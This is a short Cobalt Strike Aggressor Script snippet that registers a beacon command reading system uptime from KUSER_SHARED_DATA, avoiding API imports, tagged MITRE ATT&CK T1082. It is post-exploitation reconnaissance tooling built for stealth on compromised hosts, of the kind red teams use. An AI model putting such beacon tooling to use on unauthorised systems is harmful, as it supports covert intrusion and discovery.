# --- uptime ---
alias uptime {
    dani_run($1, "uptime", "");
}
beacon_command_register(
    "uptime",
    "Uptime via KUSER_SHARED_DATA — T1082 (by Dani)",
    "Synopsis: uptime\n\n" .
    "Description: Read system uptime directly from KUSER_SHARED_DATA without\n" .
    "calling GetTickCount or NtQuerySystemInformation. No API import.\n\n" .
    "MITRE ATT&CK: T1082 (System Information Discovery)\n\n" .
    "Phase: 1 — Canary\nArgs: none"
);

